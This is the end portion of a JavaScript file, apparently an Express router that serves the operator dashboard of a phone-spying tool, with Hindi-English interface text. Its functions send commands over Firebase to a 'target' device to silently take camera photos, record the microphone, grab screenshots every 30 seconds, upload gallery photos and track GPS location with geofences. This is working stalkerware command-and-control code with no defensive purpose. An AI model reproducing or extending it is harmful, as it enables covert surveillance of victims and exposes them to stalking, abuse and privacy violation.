    else if(s.startsWith('done')) el.textContent = '✅ '+s.replace('done_','')+ ' photos synced!';
    else if(s==='error') el.textContent = '❌ Error — permission ho sakta hai issue';
    else el.textContent = 'Target ki latest 15 photos upload karega';
  });

  // Mic status
  onValue(ref(db,'devices/'+id+'/mic/status'),(snap)=>{
    const s = snap.val();
    const el = document.getElementById('mic-status');
    const btn = document.getElementById('mic-btn');
    if(s==='recording'){
      el.textContent = '🔴 Recording ho rahi hai…';
      btn.disabled = true;
      btn.innerHTML = '<div class="spinner"></div> Recording…';
    } else {
      el.textContent = 'Silently record karega — audio yahan aayega';
      btn.disabled = false;
      btn.innerHTML = '🎙 Start Recording';
    }
  });
};

// ── Commands ──────────────────────────────────────────────────────────────────
// ── Screenshot ────────────────────────────────────────────────────────────────
let autoScrTimer = null;
window.takeScreenshot = async function(){
  if(!selId){toast('Pehle device select karo');return;}
  try{
    await set(ref(db,'devices/'+selId+'/commands/take_screenshot'),true);
    toast('🖥 Screenshot command bheja! 5-10s mein aayega');
  }catch(e){toast('❌ '+e.message);}
};
document.addEventListener('change', function(e){
  if(e.target.id==='scr-auto'){
    if(e.target.checked){
      if(!selId){toast('Pehle device select karo');e.target.checked=false;return;}
      autoScrTimer = setInterval(()=>{
        if(selId) set(ref(db,'devices/'+selId+'/commands/take_screenshot'),true).catch(()=>{});
      },30000);
      toast('🖥 Auto screenshot ON — har 30 sec');
    } else {
      clearInterval(autoScrTimer); autoScrTimer=null;
      toast('Auto screenshot OFF');
    }
  }
});

window.triggerCapture = async function(){
  if(!selId){toast('Pehle device select karo');return;}
  const btn = document.getElementById('cap-btn');
  btn.disabled=true; btn.innerHTML='<div class="spinner"></div> Bhej raha hai…';
  try{
    await set(ref(db,'devices/'+selId+'/commands/capture'),true);
    toast('📷 Capture command bheja! Photo 15-20s mein aayega');
  }catch(e){toast('❌ '+e.message);}
  btn.disabled=false; btn.innerHTML='📷 Silent Capture Karo';
};

window.triggerMic = async function(){
  if(!selId){toast('Pehle device select karo');return;}
  const btn = document.getElementById('mic-btn');
  btn.disabled=true; btn.innerHTML='<div class="spinner"></div> Bhej raha hai…';
  try{
    await set(ref(db,'devices/'+selId+'/commands/record_mic'),micDur);
    toast('🎙 Recording shuru! '+micDur+'s baad audio aayega');
  }catch(e){toast('❌ '+e.message);}
  btn.disabled=false; btn.innerHTML='🎙 Start Recording';
};

window.syncGallery = async function(){
  if(!selId){toast('Pehle device select karo');return;}
  const btn = document.getElementById('gal-btn');
  btn.disabled=true; btn.innerHTML='<div class="spinner"></div> Syncing…';
  try{
    await set(ref(db,'devices/'+selId+'/commands/send_gallery'),true);
    toast('📸 Gallery sync shuru! Kuch photos aane mein 1-2 min lag sakte hain');
  }catch(e){toast('❌ '+e.message);}
  btn.disabled=false; btn.innerHTML='📸 Sync Gallery Photos';
};

window.sendCmd = async function(cmd, val){
  if(!selId){toast('Pehle device select karo');return;}
  try{
    await set(ref(db,'devices/'+selId+'/commands/'+cmd),val);
    toast('✅ Command bheja: '+cmd);
  }catch(e){toast('❌ '+e.message);}
};

window.setGeofence = async function(){
  if(!selId){toast('Pehle device select karo');return;}
  const btn = document.getElementById('gf-btn');
  btn.disabled=true;
  try{
    const locSnap = await get(ref(db,'devices/'+selId+'/location'));
    const loc = locSnap.val();
    if(!loc){toast('❌ GPS fix nahi mila abhi'); btn.disabled=false; return;}
    const radius = parseInt(document.getElementById('gf-radius').value);
    await set(ref(db,'devices/'+selId+'/geofence/config'),{
      lat:loc.lat, lng:loc.lng, radius, timestamp:Date.now()
    });
    toast('🔔 Geofence set! '+radius+'m radius');
  }catch(e){toast('❌ '+e.message);}
  btn.disabled=false;
};

// ── Duration pills ────────────────────────────────────────────────────────────
window.setDur = function(sec, el){
  micDur = sec;
  document.querySelectorAll('.pill').forEach(p=>p.classList.remove('active'));
  el.classList.add('active');
};

document.getElementById('gf-radius').addEventListener('input',function(){
  document.getElementById('gf-radius-val').textContent = this.value+' m';
});

// ── Lightbox ──────────────────────────────────────────────────────────────────
window.openLb = function(url){
  document.getElementById('lb-img').src=url;
  document.getElementById('lb').classList.add('open');
};
window.closeLb = function(){
  document.getElementById('lb').classList.remove('open');
};

// ── Audio player ──────────────────────────────────────────────────────────────
let audioEl = null;
window.playAudio = function(url){
  if(audioEl){audioEl.pause();audioEl=null;}
  audioEl = new Audio(url);
  audioEl.play().catch(()=>toast('Audio play nahi ho raha'));
  toast('🎙 Playing audio…');
};

// ── Navigation ────────────────────────────────────────────────────────────────
window.showPage = function(id){
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('active'));
  document.getElementById(id).classList.add('active');
  event.target.classList.add('active');
  if(id==='p-location') setTimeout(()=>map.invalidateSize(),200);
};

// ── Helpers ───────────────────────────────────────────────────────────────────
function timeAgo(ts){
  const s=Math.floor((Date.now()-ts)/1000);
  if(s<60) return s+'s ago';
  if(s<3600) return Math.floor(s/60)+'m ago';
  if(s<86400) return Math.floor(s/3600)+'h ago';
  return Math.floor(s/86400)+'d ago';
}
function fmtDate(ts){
  return new Date(ts).toLocaleString('en-IN',{day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'});
}
function fmtDur(sec){
  if(!sec) return '';
  if(sec<60) return sec+'s';
  return Math.floor(sec/60)+'m '+((sec%60)?sec%60+'s':'');
}
function toast(msg){
  const t=document.getElementById('toast');
  t.textContent=msg; t.classList.add('show');
  setTimeout(()=>t.classList.remove('show'),3500);
}
window.toast = toast;
</script>
</body>
</html>`;

  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("Cache-Control", "no-store");
  res.send(html);
});

export default router;
